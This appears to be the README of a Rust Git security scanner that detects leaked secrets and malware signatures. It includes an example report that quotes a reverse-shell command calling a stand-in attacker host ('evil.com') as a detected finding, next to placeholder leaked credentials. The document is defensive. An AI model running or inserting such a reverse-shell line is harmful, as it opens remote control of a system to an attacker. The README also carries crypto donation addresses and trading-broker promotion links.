```markdown
# 🛡️ BAKOME-GitGuard v2.0

```

🛡️ Git security scanner in pure Rust: 50+ secret patterns, 30+ malware signatures, SOC2, SLSA 4, SBOM. 2000+ lines, zero deps.

```

<p align="center">
  <img src="https://via.placeholder.com/800x400/0a0a0a/00ff88?text=BAKOME+GitGuard+Security+Scanner" alt="BAKOME GitGuard" width="100%">
</p>

---

## 📖 Description

**FR** – Scanner de sécurité Git en Rust pur (stdlib uniquement). Détecte 50+ patterns de secrets (AWS, GitHub, SSH, JWT, etc.), 30+ signatures de malwares (backdoors, miners, ransomware), génère des rapports de conformité SOC2, des preuves d'intégrité SLSA Level 4 via arbre de Merkle, et des exports SBOM CycloneDX. 2000+ lignes, zéro dépendance externe, compilation avec `rustc` seul.

**EN** – Git security scanner in pure Rust (stdlib only). Detects 50+ secret patterns (AWS, GitHub, SSH, JWT, etc.), 30+ malware signatures (backdoors, miners, ransomware), generates SOC2 compliance reports, SLSA Level 4 integrity proofs via Merkle Tree, and CycloneDX SBOM exports. 2000+ lines, zero external dependencies, compiles with `rustc` alone.

**ES** – Escáner de seguridad Git en Rust puro (solo stdlib). Detecta 50+ patrones de secretos (AWS, GitHub, SSH, JWT, etc.), 30+ firmas de malware (backdoors, mineros, ransomware), genera informes de conformidad SOC2, pruebas de integridad SLSA Nivel 4 mediante árbol de Merkle, y exportaciones SBOM CycloneDX. 2000+ líneas, cero dependencias externas, compila solo con `rustc`.

---

## ⚡ Modules

| Module | Description |
|--------|-------------|
| 🔍 **Secret Scanner** | 50+ patterns: AWS, GitHub, NPM, SSH, JWT, Stripe, Twilio, databases |
| 🦠 **Malware Detector** | 30+ signatures: backdoors, reverse shells, miners, ransomware, C2 |
| 🔒 **Integrity Verifier** | Merkle Tree over full file history, SLSA Level 4 |
| 📊 **Compliance Auditor** | SOC2 score, NIST CSF score, automated audit reports |
| 📄 **SBOM Generator** | CycloneDX-ready component inventory |
| 📝 **Report Generator** | Terminal TUI, JSON, HTML-ready output |
| ⚡ **Git Engine** | Pure Rust Git object parser, commit walker, ref resolver |
| 0️⃣ **Zero Dependencies** | Pure Rust stdlib — compiles with `rustc` alone |

---

## ⚙️ Quick Install

```bash
# Compile (no Cargo required)
rustc bakome_gitguard.rs -O3 -o bakome_gitguard

# Scan a local repository
./bakome_gitguard scan /path/to/repo

# Clone and scan a remote repository
./bakome_gitguard clone https://github.com/user/repo
```

---

📊 Example Output

```
╔══════════════════════════════════════════════════════════════════╗
║   BAKOME-GitGuard v2.0                                          ║
║   GIT SECURITY AUDIT REPORT                                     ║
╚══════════════════════════════════════════════════════════════════╝

📁 Repository: /tmp/bakome-gitguard-repo
📦 Commits: 247 | Files: 89
🔐 SOC2 Score: 85.0% | NIST CSF Score: 72.3%

🔍 SECRETS FOUND: 3
   [CRITICAL] AWS Access Key ID in config/.env:12 → AWS_ACCESS_KEY_ID=AKIA...
   [CRITICAL] GitHub Personal Access Token in .github/workflows/deploy.yml:8 → ghp_1234...
   [HIGH] Generic Password Assignment in src/db.rs:45 → password="admin123"

🦠 MALWARE DETECTED: 1
   [CRITICAL] Reverse Shell in scripts/deploy.sh:3 → nc -e /bin/bash evil.com 4444

🔒 INTEGRITY
   Merkle Root: 7a3b2c...
   Leaves: 89 | Height: 7 | SLSA Level: 4

📄 SBOM: 89 components
```

---

🔗 Regulated Brokers

Broker Link
🟢 XM Global Open Account
🟢 JustMarkets Open Account

---

💰 Support

Built entirely on a Pixel 4a 5G — no laptop, no fixed Wi‑Fi.

Network Address
BTC bc1qhtjp3qpqru4vuqd355dfcn46mqjrlpdfmngk6u0
ETH 0x2fD73626714d9e37EA464109F8eCeA2CA5401062
SOL 3CfhghA7hSNPBbd1RME5rRDm5UUeesTq9NKTcyzZdkz4
USDT (TRC20) THkLdiKsmscJFwBPA4tpWeAn1xVw7DTKxq

🤝 Sponsor via Drips

---

🎁 Hardware Needed

Item Purpose
💻 Laptop 16GB Faster compilation
📡 4G/5G Router Stable connection
🖥️ Monitor Multi-project workflow
🔋 Solar Bank Electricity outages

---

👤 Author

BAKOME
Founder of BAKOME_Hub — Open Source • AI • Trading • Blockchain
🌐 https://github.com/BAKOME-Hub

---

Built on a phone. Powered by passion. 🚀

```
